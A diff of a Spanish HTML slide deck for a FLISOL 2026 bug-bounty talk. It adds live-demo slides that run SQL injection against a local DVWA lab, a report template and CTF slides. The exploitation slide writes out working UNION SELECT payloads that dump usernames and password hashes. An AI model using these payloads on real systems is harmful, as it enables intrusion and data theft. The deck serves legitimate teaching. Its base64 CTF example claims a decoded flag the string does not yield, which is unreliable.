@@ -692,17 +692,38 @@
             <!-- SLIDE 21: MI CURSO                                                  -->
             <!-- ═══════════════════════════════════════════════════════════════════ -->
             <section>
-                <h2>El Curso de Doom <span class="badge gold" style="font-size:0.45em">— Entrena Súbditos</span></h2>
-                <p><a href="https://statick88.github.io" target="_blank">statick88.github.io</a></p>
-                <div class="card-grid three">
-                    <div class="card"><h4>📅 Modalidad</h4><p>Clases en vivo 19:00-22:00</p><p style="color:var(--doom-gold)">16-27 marzo 2026</p></div>
-                    <div class="card"><h4>📜 Certificación</h4><p>Aval Ministerio del Trabajo</p><p style="color:var(--green)">Certificado profesional</p></div>
-                    <div class="card"><h4>🖥️ Simuladores</h4><p>Core i5, 8GB RAM</p><p style="color:var(--pink)">Hands-on labs</p></div>
+                <h2>🎓 Mi Curso de Ethical Hacking <span class="badge gold" style="font-size:0.45em">— Abacom</span></h2>
+                <p style="font-size:0.62em;color:var(--text-muted)">Formando hackers éticos en Ecuador. 16-27 marzo 2026.</p>
+                <div class="card-grid four">
+                    <div class="card"><h4>📅 Horario</h4><p style="font-size:0.55em">19:00 - 22:00</p><p style="color:var(--doom-gold);font-size:0.5em">Lun-Sab</p></div>
+                    <div class="card"><h4>📜 Certificado</h4><p style="font-size:0.55em">Ministerio del Trabajo</p><p style="color:var(--green);font-size:0.5em">Aval oficial</p></div>
+                    <div class="card"><h4>🖥️ Requisitos</h4><p style="font-size:0.55em">Core i5, 8GB RAM</p><p style="color:var(--cyan);font-size:0.5em">Hands-on labs</p></div>
+                    <div class="card"><h4>📍 Plataforma</h4><p style="font-size:0.55em">Virtual en vivo</p><p style="color:var(--pink);font-size:0.5em">Evaluaciones online</p></div>
                 </div>
-                <div class="doom-tip"><strong>[DOOM TIP]</strong> Hands-on > teoría. El 80% debe ser práctica.</div>
-                <div class="doom-consejo"><strong>[DOOM]</strong> Doom practicaba 20 horas diarias. ¿Tú cuánto?</div>
+                <div class="info-box" style="margin-top:0.3em">
+                    <h4>📚 Contenido del Curso</h4>
+                    <div style="display:grid;grid-template-columns:repeat(3,1fr);gap:8px;font-size:0.55em;margin-top:0.15em">
+                        <div>
+                            <strong style="color:var(--cyan)">Módulo 1-3:</strong><br>
+                            Fundamentos, Linux, Redes
+                        </div>
+                        <div>
+                            <strong style="color:var(--orange)">Módulo 4-6:</strong><br>
+                            Web Hacking, SQLi, XSS
+                        </div>
+                        <div>
+                            <strong style="color:var(--pink)">Módulo 7-9:</strong><br>
+                            Exploitation, Reportes
+                        </div>
+                    </div>
+                </div>
+                <div class="savitar-alert" style="margin-top:0.3em">
+                    <h4>👨‍🏫 Sobre Diego (Tu Docente)</h4>
+                    <p><strong>10+ años</strong> como FullStack Developer. <strong>Profesor universitario</strong> en ESPE, UIDE, IST Juan Montalvo, Abacom y Codings Academy. Estudiante de <strong>Máster UCM en Ciberseguridad</strong>. Participante en <strong>RootedCON 2026 CTF</strong> (15/15 challenges resueltos).</p>
+                </div>
+                <div class="doom-tip"><strong>[DOOM TIP]</strong> <a href="https://statick88.github.io" target="_blank">statick88.github.io</a> — Más de 70+ challenges hands-on para practicar.</div>
+                <div class="doom-consejo"><strong>[DOOM]</strong> La práctica vence a la teoría. 80% hands-on, 20% conceptos.</div>
                 <div class="slide-footer">
-                    
                     <span class="footer-text">Dr. Doom: Bug Bounty | FLISOL 2026</span>
                 </div>
             </section>
@@ -847,7 +868,1025 @@
             </section>
 
             <!-- ═══════════════════════════════════════════════════════════════════ -->
-            <!-- SLIDE 22: GRACIAS                                                    -->
+            <!-- SLIDE 22: LIVE DEMO - INTRO                                         -->
+            <!-- ═══════════════════════════════════════════════════════════════════ -->
+            <section>
+                <h2>🦹‍♂️ Live Demo <span style="color:var(--doom-gold)">— Entrenamiento Ético</span></h2>
+                <p style="font-size:0.65em;color:var(--text-muted)">Doom demuestra técnicas en laboratorio local. <strong>Solo para aprendizaje.</strong></p>
+                <div class="savitar-alert">
+                    <h4>⚠️ DECLARACIÓN ÉTICA — Lee ANTES de continuar</h4>
+                    <p>Este demo usa <strong>DVWA en Docker local</strong> (tu propia máquina). Las técnicas mostradas <strong>SOLO deben aplicarse en:</strong></p>
+                    <ul style="font-size:0.58em;margin-top:0.15em">
+                        <li>✅ Laboratorios propios (DVWA, Juice Shop, HackTheBox)</li>
+                        <li>✅ Programas de Bug Bounty con scope definido</li>
+                        <li>✅ Targets con autorización explícita por escrito</li>
+                        <li>❌ NUNCA en sistemas sin permiso explícito</li>
+                    </ul>
+                </div>
+                <div class="card-grid four" style="margin-top:0.3em">
+                    <div class="card" style="border-color:var(--cyan)">
+                        <h4 style="color:var(--cyan)">🔍 Fase 1</h4>
+                        <p style="font-size:0.58em">Recon</p>
+                        <p style="color:var(--cyan);font-size:0.5em">~5 min</p>
+                    </div>
+                    <div class="card" style="border-color:var(--green)">
+                        <h4 style="color:var(--green)">📋 Fase 2</h4>
+                        <p style="font-size:0.58em">Enumeración</p>
+                        <p style="color:var(--green);font-size:0.5em">~8 min</p>
+                    </div>
+                    <div class="card" style="border-color:var(--pink)">
+                        <h4 style="color:var(--pink)">💥 Fase 3</h4>
+                        <p style="font-size:0.58em">Explotación</p>
+                        <p style="color:var(--pink);font-size:0.5em">~10 min</p>
+                    </div>
+                    <div class="card" style="border-color:var(--orange)">
+                        <h4 style="color:var(--orange)">📝 Fase 4</h4>
+                        <p style="font-size:0.58em">Reporte</p>
+                        <p style="color:var(--orange);font-size:0.5em">~5 min</p>
+                    </div>
+                </div>
+                <div class="info-box" style="margin-top:0.3em">
+                    <h4>🎯 Entorno de Entrenamiento</h4>
+                    <p><strong style="color:var(--green)">DVWA (Docker local)</strong> — Damn Vulnerable Web Application</p>
+                    <p><span class="badge green">Scope: localhost</span> <span class="badge cyan">Training Only</span> <span class="badge orange">No Bounty</span></p>
+                </div>
+                <div class="doom-tip"><strong>[DOOM TIP]</strong> Si no tienes autorización POR ESCRITO, no toques nada. Fin de la discusión.</div>
+                <div class="slide-footer">
+                    <span class="footer-text">Dr. Doom: Bug Bounty | FLISOL 2026</span>
+                </div>
+            </section>
+
+            <!-- ═══════════════════════════════════════════════════════════════════ -->
+            <!-- SLIDE 23: LIVE DEMO - RECON                                          -->
+            <!-- ═══════════════════════════════════════════════════════════════════ -->
+            <section>
+                <h2>Fase 1: Recon <span style="color:var(--cyan)">— Descubrimiento</span></h2>
+                <p style="font-size:0.62em;color:var(--text-muted)">El 70% del trabajo. Doom nunca ataca ciegamente.</p>
+                <div class="columns">
+                    <div>
+                        <div class="terminal" style="font-size:0.52em">
+                            <div class="line"><span class="comment"># 1. Verificar que DVWA está corriendo</span></div>
+                            <div class="line"><span class="prompt">$</span> <span class="command">docker ps | grep dvwa</span></div>
+                            <div class="line"><span class="output">CONTAINER ID   IMAGE              PORTS</span></div>
+                            <div class="line"><span class="output">abc123         vulnerables/web-dvwa   0.0.0.0:80->80/tcp</span></div>
+                            <div class="line">&nbsp;</div>
+                            <div class="line"><span class="comment"># 2. Acceder a DVWA</span></div>
+                            <div class="line"><span class="prompt">$</span> <span class="command">curl -s http://localhost:80 | head -20</span></div>
+                            <div class="line"><span class="output">&lt;title>Damn Vulnerable Web App&lt;/title></span></div>
+                            <div class="line"><span class="output">&lt;!-- DVWA v1.10 (vulnerabilities)--></span></div>
+                            <div class="line">&nbsp;</div>
+                            <div class="line"><span class="comment"># 3. Módulos DVWA disponibles</span></div>
+                            <div class="line"><span class="prompt">$</span> <span class="command">curl -s http://localhost/vulnerabilities/ | grep "href"</span></div>
+                            <div class="line"><span class="output">/vulnerabilities/sqli/</span></div>
+                            <div class="line"><span class="output">/vulnerabilities/xss_r/</span></div>
+                            <div class="line"><span class="output">/vulnerabilities/xss_s/</span></div>
+                            <div class="line"><span class="output">/vulnerabilities/csrf/</span></div>
+                            <div class="line"><span class="output">/vulnerabilities/upload/</span></div>
+                            <div class="line">&nbsp;</div>
+                            <div class="line"><span class="comment"># 4. Technology fingerprint</span></div>
+                            <div class="line"><span class="prompt">$</span> <span class="command">whatweb http://localhost</span></div>
+                            <div class="line"><span class="output">Apache[2.4.x], PHP[8.x], MySQL</span></div>
+                        </div>
+                    </div>
+                    <div>
+                        <div class="info-box cyan">
+                            <h4>✅ Recon Checklist DVWA</h4>
+                            <ul>
+                                <li><span style="color:var(--green)">✓</span> DVWA activo en puerto 80</li>
+                                <li><span style="color:var(--green)">✓</span> 7+ módulos vulnerables</li>
+                                <li><span style="color:var(--green)">✓</span> Tecnologías: Apache, PHP, MySQL</li>
+                                <li><span style="color:var(--green)">✓</span> Login: admin / password</li>
+                                <li><span style="color:var(--orange)">⚠</span> Nivel seguridad configurable</li>
+                            </ul>
+                        </div>
+                        <div class="info-box" style="margin-top:0.3em">
+                            <h4>📚 Módulos DVWA</h4>
+                            <p style="font-size:0.55em">
+                                <span class="badge pink">SQLi</span>
+                                <span class="badge orange">XSS Reflected</span>
+                                <span class="badge cyan">XSS Stored</span>
+                                <span class="badge green">CSRF</span>
+                                <span class="badge gold">File Upload</span>
+                            </p>
+                        </div>
+                        <div class="doom-tip" style="margin-top:0.3em"><strong>[DOOM TIP]</strong> DVWA tiene módulos específicos — no inventes endpoints que no existen.</div>
+                    </div>
+                </div>
+                <div class="doom-consejo"><strong>[DOOM]</strong> Conoce tu target. DVWA tiene 7 módulos — estudia cada uno.</div>
+                <div class="slide-footer">
+                    <span class="footer-text">Dr. Doom: Bug Bounty | FLISOL 2026</span>
+                </div>
+            </section>
+
+            <!-- ═══════════════════════════════════════════════════════════════════ -->
+            <!-- SLIDE 24: LIVE DEMO - ENUMERATION                                    -->
+            <!-- ═══════════════════════════════════════════════════════════════════ -->
+            <section>
+                <h2>Fase 2: Enumeración <span style="color:var(--green)">— Mapeo DVWA</span></h2>
+                <p style="font-size:0.62em;color:var(--text-muted)">Identifica módulos vulnerables y parámetros de entrada.</p>
+                <div class="columns">
+                    <div>
+                        <div class="terminal" style="font-size:0.52em">
+                            <div class="line"><span class="comment"># 1. Listar módulos vulnerables de DVWA</span></div>
+                            <div class="line"><span class="prompt">$</span> <span class="command">curl -s http://localhost/vulnerabilities/ | grep -oP 'href="\K[^"]+' | sort -u</span></div>
+                            <div class="line"><span class="output">/vulnerabilities/brute/</span></div>
+                            <div class="line"><span class="output">/vulnerabilities/csrf/</span></div>
+                            <div class="line"><span class="output">/vulnerabilities/exec/</span></div>
+                            <div class="line"><span class="output">/vulnerabilities/sqli/</span></div>
+                            <div class="line"><span class="output">/vulnerabilities/upload/</span></div>
+                            <div class="line"><span class="output">/vulnerabilities/xss_r/</span></div>
+                            <div class="line"><span class="output">/vulnerabilities/xss_s/</span></div>
+                            <div class="line">&nbsp;</div>
+                            <div class="line"><span class="comment"># 2. Analizar módulo SQLi</span></div>
+                            <div class="line"><span class="prompt">$</span> <span class="command">curl -s "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" | grep -i "input\|name"</span></div>
+                            <div class="line"><span class="output">&lt;input type='text' name='id'>&lt;/parameter></span></div>
+                            <div class="line"><span class="output">&lt;input type='submit' name='Submit' value='Submit'></span></div>
+                            <div class="line">&nbsp;</div>
+                            <div class="line"><span class="comment"># 3. Verificar nivel de seguridad</span></div>
+                            <div class="line"><span class="prompt">$</span> <span class="command">curl -s http://localhost/security.php | grep -i "security_level"</span></div>
+                            <div class="line"><span class="output">security_level: low</span></div>
+                        </div>
+                    </div>
+                    <div>
+                        <div class="info-box green">
+                            <h4>📋 Módulos DVWA Identificados</h4>
+                            <ul>
+                                <li><strong style="color:var(--pink)">/sqli/</strong> — SQL Injection <span class="badge pink">LOW</span></li>
+                                <li><strong style="color:var(--pink)">/xss_r/</strong> — XSS Reflected</li>
+                                <li><strong style="color:var(--pink)">/xss_s/</strong> — XSS Stored</li>
+                                <li><strong style="color:var(--pink)">/csrf/</strong> — CSRF</li>
+                                <li><strong style="color:var(--pink)">/upload/</strong> — File Upload</li>
+                                <li><strong style="color:var(--pink)">/exec/</strong> — Command Injection</li>
+                            </ul>
+                        </div>
+                        <div class="info-box" style="margin-top:0.3em">
+                            <h4>🎯 Parámetro Identificado</h4>
+                            <p><code>/sqli/?id=1&Submit=Submit</code></p>
+                            <p style="font-size:0.55em"><strong>Parámetro vulnerable:</strong> <code>id</code></p>
+                        </div>
+                        <div class="doom-tip" style="margin-top:0.3em"><strong>[DOOM TIP]</strong> DVWA security level: LOW = fácil, MEDIUM = medio, HIGH = difícil, IMPOSIBLE = seguro.</div>
+                    </div>
+                </div>
+                <div class="doom-consejo"><strong>[DOOM]</strong> Estudia el target. Cada módulo de DVWA enseña una vulnerabilidad diferente.</div>
+                <div class="slide-footer">
+                    <span class="footer-text">Dr. Doom: Bug Bounty | FLISOL 2026</span>
+                </div>
+            </section>
+
+            <!-- ═══════════════════════════════════════════════════════════════════ -->
+            <!-- SLIDE 25: LIVE DEMO - EXPLOITATION                                   -->
+            <!-- ═══════════════════════════════════════════════════════════════════ -->
+            <section>
+                <h2>Fase 3: Explotación <span style="color:var(--pink)">— SQL Injection</span></h2>
+                <p style="font-size:0.62em;color:var(--text-muted)">DVWA módulo SQLi (security: low). ¡Gloria ética!</p>
+                <div class="columns">
+                    <div>
+                        <div class="terminal" style="font-size:0.5em">
+                            <div class="line"><span class="comment"># 1. Test básico SQLi en DVWA</span></div>
+                            <div class="line"><span class="prompt">$</span> <span class="command">curl "http://localhost/vulnerabilities/sqli/?id=1'&Submit=Submit"</span></div>
+                            <div class="line"><span class="output" style="color:var(--pink)">You have an error in your SQL syntax</span></div>
+                            <div class="line"><span class="output" style="color:var(--green)">✓ SQLi CONFIRMED</span></div>
+                            <div class="line">&nbsp;</div>
+                            <div class="line"><span class="comment"># 2. Determinar número de columnas</span></div>
+                            <div class="line"><span class="prompt">$</span> <span class="command">curl "http://localhost/vulnerabilities/sqli/?id=1' ORDER BY 2--"</span></div>
+                            <div class="line"><span class="output">✓ Funciona (2 columnas)</span></div>
+                            <div class="line">&nbsp;</div>
+                            <div class="line"><span class="comment"># 3. UNION SELECT para extraer datos</span></div>
+                            <div class="line"><span class="prompt">$</span> <span class="command">curl "http://localhost/vulnerabilities/sqli/?id=1' UNION SELECT user(),version()--"</span></div>
+                            <div class="line"><span class="output" style="color:var(--doom-gold)">root@localhost | MySQL 5.7</span></div>
+                            <div class="line">&nbsp;</div>
+                            <div class="line"><span class="comment"># 4. Extraer nombres de tablas</span></div>
+                            <div class="line"><span class="prompt">$</span> <span class="command">curl "http://localhost/vulnerabilities/sqli/?id=1' UNION SELECT table_name,2 FROM information_schema.tables--"</span></div>
+                            <div class="line"><span class="output">guestbook, users</span></div>
+                            <div class="line">&nbsp;</div>
+                            <div class="line"><span class="comment"># 5. Extraer usuarios (SOLO en lab local)</span></div>
+                            <div class="line"><span class="prompt">$</span> <span class="command">curl "http://localhost/vulnerabilities/sqli/?id=1' UNION SELECT user,password FROM users--"</span></div>
+                            <div class="line"><span class="output" style="color:var(--orange)">admin | 5f4dcc3b5aa765d61d8327deb882cf99</span></div>
+                        </div>
+                        <div class="info-box orange" style="margin-top:0.2em">
+                            <h4>⚠️ DISCLAIMER ÉTICO</h4>
+                            <p style="font-size:0.52em">Los hashes mostrados son <strong>MD5 de ejemplo</strong> del DVWA. En Bug Bounty real, <strong>NUNCA</strong> incluyas datos reales de usuarios en reportes. Solo demuestra la vulnerabilidad, no expongas información.</p>
+                        </div>
+                    </div>
+                    <div>
+                        <div class="info-box pink">
+                            <h4>💀 Vulnerabilidad Encontrada</h4>
+                            <ul>
+                                <li><strong>Tipo:</strong> SQL Injection (Union Based)</li>
+                                <li><strong>CVSS:</strong> <span style="color:var(--pink)">9.8 — Critical</span></li>
+                                <li><strong>Parámetro:</strong> <code>id</code></li>
+                                <li><strong>Módulo DVWA:</strong> <code>/vulnerabilities/sqli/</code></li>
+                                <li><strong>Impacto:</strong> Lectura de base de datos</li>
+                            </ul>
+                        </div>
+                        <div class="info-box orange" style="margin-top:0.3em">
+                            <h4>🚫 Límites Éticos — SIEMPRE</h4>
+                            <ul>
+                                <li>NO modificar datos en producción</li>
+                                <li>NO exponer datos reales de usuarios</li>
+                                <li>NO usar sqlmap en producción sin permiso</li>
+                                <li>Documentar solo la prueba mínima necesaria</li>
+                            </ul>
+                        </div>
+                        <div class="info-box cyan" style="margin-top:0.3em">
+                            <h4>🎓 Contexto Diego</h4>
+                            <p style="font-size:0.55em">Como docente de <strong>ESPE y UIDE</strong>, enseño que SQLi es la vulnerabilidad #1 en OWASP Top 10. Practicar en DVWA es el primer paso antes de Bug Bounty.</p>
+                        </div>
+                    </div>
+                </div>
+                <div class="doom-tip"><strong>[DOOM TIP]</strong> SQLi sigue siendo Critical en 2026. Aprende a reportarlo correctamente.</div>
+                <div class="doom-consejo"><strong>[DOOM]</strong> El PoC debe ser reproducible pero NO debe exponer datos reales. Ética primero.</div>
+                <div class="slide-footer">
+                    <span class="footer-text">Dr. Doom: Bug Bounty | FLISOL 2026</span>
+                </div>
+            </section>
+
+            <!-- ═══════════════════════════════════════════════════════════════════ -->
+            <!-- SLIDE 26: LIVE DEMO - REPORTING                                      -->
+            <!-- ═══════════════════════════════════════════════════════════════════ -->
+            <section>
+                <h2>Fase 4: Reporte <span style="color:var(--orange)">— Cobrar</span></h2>
+                <p style="font-size:0.62em;color:var(--text-muted)">Un buen reporte = bounty. Un mal reporte = waste.</p>
+                <div class="columns">
+                    <div>
+                        <div class="info-box orange">
+                            <h4>📋 Estructura del Reporte</h4>
+                            <ul>
+                                <li><strong style="color:var(--doom-gold)">1. Título:</strong> SQLi en /api?search — User Data Leak</li>
+                                <li><strong style="color:var(--doom-gold)">2. Severity:</strong> Critical (CVSS 9.8)</li>
+                                <li><strong style="color:var(--doom-gold)">3. Summary:</strong> 2-3 líneas máximo</li>
+                                <li><strong style="color:var(--doom-gold)">4. Steps:</strong> Reproducción paso a paso</li>
+                                <li><strong style="color:var(--doom-gold)">5. Impact:</strong> Business impact claro</li>
+                                <li><strong style="color:var(--doom-gold)">6. Remediation:</strong> Prepared statements</li>
+                                <li><strong style="color:var(--doom-gold)">7. Evidence:</strong> Screenshots + curl commands</li>
+                            </ul>
+                        </div>
+                        <div class="info-box cyan" style="margin-top:0.3em">
+                            <h4>🎯 CVSS Breakdown</h4>
+                            <p style="font-size:0.58em">
+                                <strong>AV:</strong> Network | <strong>AC:</strong> Low | <strong>PR:</strong> None | <strong>S:</strong> Unchanged<br>
+                                <strong>UI:</strong> None | <strong>C:</strong> High | <strong>I:</strong> High | <strong>A:</strong> None
+                            </p>
+                            <p style="color:var(--pink);margin-top:0.1em"><strong>CVSS: 9.8 CRITICAL</strong></p>
+                        </div>
+                    </div>
+                    <div>
+                        <div class="terminal" style="font-size:0.5em">
+                            <div class="line" style="color:var(--doom-gold)">══════════════════════════════════════</div>
+                            <div class="line" style="color:var(--orange)">[REPORT TEMPLATE]</div>
+                            <div class="line" style="color:var(--doom-gold)">══════════════════════════════════════</div>
+                            <div class="line">&nbsp;</div>
+                            <div class="line"><span style="color:var(--doom-gold)">Title:</span> SQL Injection in /api?search</div>
+                            <div class="line"><span style="color:var(--pink)">Severity:</span> Critical (9.8)</div>
+                            <div class="line">&nbsp;</div>
+                            <div class="line"><span style="color:var(--cyan)">Summary:</span></div>
+                            <div class="line">The search parameter in /api endpoint is</div>
+                            <div class="line">vulnerable to SQL injection, allowing</div>
+                            <div class="line">extraction of user credentials.</div>
+                            <div class="line">&nbsp;</div>
+                            <div class="line"><span style="color:var(--green)">Steps to Reproduce:</span></div>
+                            <div class="line">1. Navigate to /api?search=test'</div>
+                            <div class="line">2. Observe SQL error in response</div>
+                            <div class="line">3. Run: sqlmap -u "target?search=1"</div>
+                            <div class="line">&nbsp;</div>
+                            <div class="line"><span style="color:var(--orange)">Impact:</span></div>
+                            <div class="line">- Full user database extraction</div>
+                            <div class="line">- Password hashes accessible</div>
+                            <div class="line">- Potential account takeover</div>
+                            <div class="line">&nbsp;</div>
+                            <div class="line"><span style="color:var(--cyan)">Remediation:</span></div>
+                            <div class="line">- Use prepared statements</div>
+                            <div class="line">- Input validation + sanitization</div>
+                            <div class="line">- WAF rules for SQLi patterns</div>
+                            <div class="line" style="color:var(--doom-gold)">══════════════════════════════════════</div>
+                        </div>
+                    </div>
+                </div>
+                <div class="doom-tip"><strong>[DOOM TIP]</strong> Reproducibilidad = bounty. Si no pueden reproducir, no pagan.</div>
+                <div class="doom-consejo"><strong>[DOOM]</strong> El reporte es tu obra maestra. Escríbelo como si fueras un médico forense.</div>
+                <div class="slide-footer">
+                    <span class="footer-text">Dr. Doom: Bug Bounty | FLISOL 2026</span>
+                </div>
+            </section>
+
+            <!-- ═══════════════════════════════════════════════════════════════════ -->
+            <!-- SLIDE 27: LIVE DEMO - EVIDENCE                                       -->
+            <!-- ═══════════════════════════════════════════════════════════════════ -->
+            <section>
+                <h2>Evidencias <span style="color:var(--green)">— Proof of Concept</span></h2>
+                <p style="font-size:0.62em;color:var(--text-muted)">Sin evidencia = sin bounty. Documenta TODO.</p>
+                <div class="columns">
+                    <div>
+                        <div class="info-box green">
+                            <h4>📸 Checklist de Evidencias</h4>
+                            <ul>
+                                <li><span style="color:var(--green)">✓</span> Screenshot del error SQL</li>
+                                <li><span style="color:var(--green)">✓</span> Output de sqlmap (parcial)</li>
+                                <li><span style="color:var(--green)">✓</span> Requests/Responses en Burp</li>
+                                <li><span style="color:var(--green)">✓</span> curl commands funcionales</li>
+                                <li><span style="color:var(--orange)">⚠</span> NO incluir datos reales de usuarios</li>
+                            </ul>
+                        </div>
+                        <div class="terminal" style="font-size:0.55em;margin-top:0.3em">
+                            <div class="line"><span class="comment"># Capturar request en Burp</span></div>
+                            <div class="line"><span class="prompt">$</span> <span class="command">echo "curl request capturado"</span></div>
+                            <div class="line"><span class="comment"># Exportar como text + screenshots</span></div>
+                            <div class="line"><span class="prompt">$</span> <span class="command">mkdir -p evidence/</span></div>
+                            <div class="line"><span class="prompt">$</span> <span class="command">cp burp_export.txt evidence/</span></div>
+                            <div class="line"><span class="prompt">$</span> <span class="command">cp *.png evidence/</span></div>
+                        </div>
+                    </div>
+                    <div>
+                        <div class="info-box pink">
+                            <h4>❌ Qué NO hacer</h4>
+                            <ul>
+                                <li>NO dump base de datos completa</li>
+                                <li>NO enviar credenciales reales</li>
+                                <li>NO screenshots con datos personales</li>
+                                <li>NO acceder a otros usuarios</li>
+                                <li>NO modificar/delatar datos</li>
+                            </ul>
+                        </div>
+                        <div class="info-box" style="margin-top:0.3em">
+                            <h4>✅ Evidencia responsable</h4>
+                            <ul>
+                                <li>Mostrar PRIMERA fila de la query</li>
+                                <li>Blur passwords/PII</li>
+                                <li>Anonymizar datos sensibles</li>
+                                <li>Limitar a PoC mínimo necesario</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                <div class="doom-tip"><strong>[DOOM TIP]</strong> Doom NO expone súbditos. Tú tampoco debes exponer usuarios reales.</div>
+                <div class="doom-consejo"><strong>[DOOM]</strong> Demostrar el bug ≠ exponer datos. Sé ético, siempre.</div>
+                <div class="slide-footer">
+                    <span class="footer-text">Dr. Doom: Bug Bounty | FLISOL 2026</span>
+                </div>
+            </section>
+
+            <!-- ═══════════════════════════════════════════════════════════════════ -->
+            <!-- SLIDE 28: LIVE DEMO - RESUMEN                                       -->
+            <!-- ═══════════════════════════════════════════════════════════════════ -->
+            <section>
+                <h2>Live Demo <span style="color:var(--doom-gold)">— Resumen</span></h2>
+                <p style="font-size:0.62em;color:var(--text-muted)">30 minutos de ataque. 1 vulnerability. 1 reporte impecable.</p>
+                <div class="timeline" style="grid-template-columns: repeat(4, 1fr);">
+                    <div class="timeline-item" style="border-color:var(--cyan)">
+                        <h4 style="color:var(--cyan)">RECON</h4>
+                        <p>subfinder</p>
+                        <p>httpx</p>
+                        <p>nmap</p>
+                        <p style="color:var(--cyan)">5 min</p>
+                    </div>
+                    <div class="timeline-item" style="border-color:var(--green)">
+                        <h4 style="color:var(--green)">ENUM</h4>
+                        <p>ffuf</p>
+                        <p>nuclei</p>
+                        <p>params</p>
+                        <p style="color:var(--green)">8 min</p>
+                    </div>
+                    <div class="timeline-item" style="border-color:var(--pink)">
+                        <h4 style="color:var(--pink)">EXPLOIT</h4>
+                        <p>SQLi test</p>
+                        <p>sqlmap</p>
+                        <p>extract</p>
+                        <p style="color:var(--pink)">10 min</p>
+                    </div>
+                    <div class="timeline-item" style="border-color:var(--orange)">
+                        <h4 style="color:var(--orange)">REPORT</h4>
+                        <p>template</p>
+                        <p>evidence</p>
+                        <p>submit</p>
+                        <p style="color:var(--orange)">7 min</p>
+                    </div>
+                </div>
+                <div class="card-grid three" style="margin-top:0.3em">
+                    <div class="card" style="border-color:var(--pink)">
+                        <h4 style="color:var(--pink)">🐛 Bug Encontrado</h4>
+                        <p>SQL Injection</p>
+                        <p style="color:var(--pink)">Critical — 9.8</p>
+                    </div>
+                    <div class="card" style="border-color:var(--doom-gold)">
+                        <h4 style="color:var(--doom-gold)">⏱️ Tiempo Total</h4>
+                        <p>30 minutos</p>
+                        <p style="color:var(--doom-gold)">Efficient = Doom</p>
+                    </div>
+                    <div class="card" style="border-color:var(--green)">
+                        <h4 style="color:var(--green)">💰 Resultado</h4>
+                        <p>Reporte listo</p>
+                        <p style="color:var(--green)">Bounty estimado: $500-$2000</p>
+                    </div>
+                </div>
+                <div class="doom-tip"><strong>[DOOM TIP]</strong> Flujo = speed. Sin flujo = caos. Practica hasta que sea instintivo.</div>
+                <div class="doom-consejo"><strong>[DOOM]</strong> Repite este flujo 100 veces. Entonces serás como Doom.</div>
+                <div class="slide-footer">
+                    <span class="footer-text">Dr. Doom: Bug Bounty | FLISOL 2026</span>
+                </div>
+            </section>
+
+            <!-- ═══════════════════════════════════════════════════════════════════ -->
+            <!-- SLIDE 29: CTF CHALLENGE - INTRO (ROOTEDCON 2026)                    -->
+            <!-- ═══════════════════════════════════════════════════════════════════ -->
+            <section>
+                <h2>🏆 CTF Challenge <span style="color:var(--doom-gold)">— RootedCON 2026</span></h2>
+                <p style="font-size:0.62em;color:var(--text-muted)">Mi experiencia real en RootedCON — resolví 15 desafíos multidisciplinares.</p>
+                <div class="savitar-alert">
+                    <h4>📋 Contexto: RootedCON 2026 CTF - Track ProtAAPP</h4>
+                    <p>Competición real donde resolví 15 challenges usando <strong>Python scripting</strong>, <strong>Kali Linux</strong> y <strong>Tailscale</strong>. Documentación académica bajo estándares del Máster UCM.</p>
+                    <p style="margin-top:0.15em"><a href="https://github.com/statick88/challenges/tree/main/ctf/rootedcon2026" target="_blank">📄 Ver repo con soluciones →</a></p>
+                </div>
+                <div class="card-grid three" style="margin-top:0.3em">
+                    <div class="card" style="border-color:var(--green)">
+                        <h4 style="color:var(--green)">🔐 Crypto</h4>
+                        <p style="font-size:0.55em">Cifrado, hashing</p>
+                        <p style="color:var(--green);font-size:0.5em">5 challenges</p>
+                    </div>
+                    <div class="card" style="border-color:var(--orange)">
+                        <h4 style="color:var(--orange)">🌐 Web</h4>
+                        <p style="font-size:0.55em">Inyección, XSS</p>
+                        <p style="color:var(--orange);font-size:0.5em">4 challenges</p>
+                    </div>
+                    <div class="card" style="border-color:var(--pink)">
+                        <h4 style="color:var(--pink)">🔍 Forensics</h4>
+                        <p style="font-size:0.55em">Análisis, reversing</p>
+                        <p style="color:var(--pink);font-size:0.5em">6 challenges</p>
+                    </div>
+                </div>
+                <div class="terminal" style="margin-top:0.3em;font-size:0.52em">
+                    <div class="line"><span class="comment"># Mi setup durante RootedCON 2026</span></div>
+                    <div class="line"><span class="prompt">$</span> <span class="command">cat setup.sh</span></div>
+                    <div class="line"><span class="output">#!/bin/bash</span></div>
+                    <div class="line"><span class="output">sudo openvpn config.ovpn  # Conexión VPN del CTF</span></div>
+                    <div class="line"><span class="output">tailscale up               # Acceso a infra híbrida</span></div>
+                    <div class="line"><span class="output">python3 solver.py --all    # Mis scripts automatizados</span></div>
+                    <div class="line"><span class="output">echo "¡A por las flags!" 🚩</span></div>
+                </div>
+                <div class="doom-tip"><strong>[DOOM TIP]</strong> CTFs con deadlines reales te preparan para Bug Bounty bajo presión.</div>
+                <div class="doom-consejo"><strong>[DOOM]</strong> En RootedCON aprendí que scripting en Python es ESSENCIAL. 70% de mis resoluciones fueron automatizadas.</div>
+                <div class="slide-footer">
+                    <span class="footer-text">Dr. Doom: Bug Bounty | FLISOL 2026</span>
+                </div>
+            </section>
+
+            <!-- ═══════════════════════════════════════════════════════════════════ -->
+            <!-- SLIDE 30: CTF - CRYPTO CHALLENGE (REAL EXAMPLE)                     -->
+            <!-- ═══════════════════════════════════════════════════════════════════ -->
+            <section>
+                <h2>🔐 Challenge Crypto <span style="color:var(--green)">— Ejemplo Real</span></h2>
+                <p style="font-size:0.62em;color:var(--text-muted)">Cómo resolví un challenge de cifrado en RootedCON.</p>
+                <div class="columns">
+                    <div>
+                        <div class="terminal" style="font-size:0.5em">
+                            <div class="line"><span class="comment"># Enunciado: Decodificar cadena cifrada</span></div>
+                            <div class="line"><span class="prompt">$</span> <span class="command">cat challenge.txt</span></div>
+                            <div class="line"><span class="output">Y3liZXRhe2RlY29kZV9tZV9ub3cf</span></div>
+                            <div class="line">&nbsp;</div>
+                            <div class="line"><span class="comment"># 1. Identificar encoding (base64)</span></div>
+                            <div class="line"><span class="prompt">$</span> <span class="command">echo "Y3liZXRhe2RlY29kZV9tZV9ub3cf" | base64 -d</span></div>
+                            <div class="line"><span class="output">cybertax{decode_me_now}</span></div>
+                            <div class="line"><span class="output" style="color:var(--green)">✓ Flag encontrada!</span></div>
+                            <div class="line">&nbsp;</div>
+                            <div class="line"><span class="comment"># Script Python automatizado</span></div>
